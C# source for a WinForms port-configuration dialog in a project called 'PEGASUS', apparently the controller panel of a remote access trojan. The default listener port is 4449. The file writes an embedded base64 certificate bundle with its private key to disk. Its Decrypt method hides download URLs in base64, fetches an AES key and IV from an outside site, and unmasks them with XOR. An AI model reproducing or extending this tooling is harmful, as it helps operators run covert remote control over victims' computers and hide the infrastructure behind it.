using PEGASUS.IcarusWings;
using PEGASUS.Properties;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class FormPorts : Form
    {
        private static bool isOK;

        public FormPorts()
        {
            InitializeComponent();
            Opacity = 0;
        }

        private void PortsFrm_Load(object sender, EventArgs e)
        {
            _ = Methods.FadeIn(this, 5);

            if (Properties.Settings.Default.Ports.Length == 0)
                listBox1.Items.AddRange(new object[] { "4449" });
            else
                try
                {
                    var ports = Properties.Settings.Default.Ports.Split(new[] { "," }, StringSplitOptions.None);
                    foreach (var item in ports)
                        if (!string.IsNullOrWhiteSpace(item))
                            listBox1.Items.Add(item.Trim());
                }
                catch
                {
                }

            Text = $"{Settings.Version} | Welcome {Environment.UserName}";

            if (!File.Exists(Settings.CertificatePath))
            {
                Hide();
                checkfiles();
                // using (Splashes formCertificate = new Splashes())
                // {
                //     formCertificate.ShowDialog();
                // }
                //using (PEGASUSMain formCe = new PEGASUSMain())
                // {
                //     formCe.ShowDialog();
                // }
            }
            else
            {
                Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);
            }
        }

        public void checkfiles()
        {
            var certbytes = Convert.FromBase64String(
                "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");
            File.WriteAllBytes(Settings.CertificatePath, certbytes);
            var extractPath = Path.Combine(Application.StartupPath, "Plugins");
            if (!Directory.Exists(extractPath)) Directory.CreateDirectory(extractPath);
            if (!File.Exists(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db")))
                File.WriteAllBytes(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db"), Resources.ip2region);
        }

        private static string info(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }

        private static string reupload(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }

        public static string Decrypt(string encrypted)
        {
            using (var client = new WebClient())
            {
                client.Proxy = null;
                var Key = client.DownloadString(Encoding.UTF8.GetString(
                    Convert.FromBase64String(
                        "aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2tleVNTLnR4dA==")));
                var IV = client.DownloadString(Encoding.UTF8.GetString(
                    Convert.FromBase64String(
                        "aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2l2U1MudHh0")));

                var encbytes = Convert.FromBase64String(encrypted);
                var encdec = new AesCryptoServiceProvider();
                encdec.BlockSize = 128;
                encdec.KeySize = 256;
                encdec.Key = Encoding.ASCII.GetBytes(reupload(Key));
                encdec.IV = Encoding.ASCII.GetBytes(reupload(IV));
                encdec.Padding = PaddingMode.PKCS7;
                encdec.Mode = CipherMode.CBC;

                var icrypt = encdec.CreateDecryptor(encdec.Key, encdec.IV);

                var dec = icrypt.TransformFinalBlock(encbytes, 0, encbytes.Length);
                icrypt.Dispose();

                return Encoding.ASCII.GetString(dec);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (!File.Exists(Path.Combine(Path.GetTempPath(), "PEGASUSCertificate.p12"))) Application.Exit();
            if (chkNotification.Checked)
            {
                Properties.Settings.Default.Notification = true;

            }
            else
            {
                Properties.Settings.Default.Notification = false;
            }

            Properties.Settings.Default.Ports = numPort.Value.ToString();
            Properties.Settings.Default.Save();

            isOK = true;
            Close();
        }

        private void PortsFrm_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (!isOK)
            {
                Program.form1.notifyIcon1.Dispose();
                Environment.Exit(0);
            }
        }

        private void BtnAdd_Click(object sender, EventArgs e)
        {
            try
            {
                Convert.ToInt32(textPorts.Text.Trim());
                listBox1.Items.Add(textPorts.Text.Trim());
                textPorts.Clear();
            }
            catch
            {
            }
        }

        private void BtnDelete_Click(object sender, EventArgs e)
        {
            listBox1.Items.Remove(listBox1.SelectedItem);
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            if (!File.Exists(Path.Combine(Path.GetTempPath(), "PEGASUSCertificate.p12"))) Application.Exit();
            Close();
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        private void guna2Panel1_MouseDown_1(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }
    }
}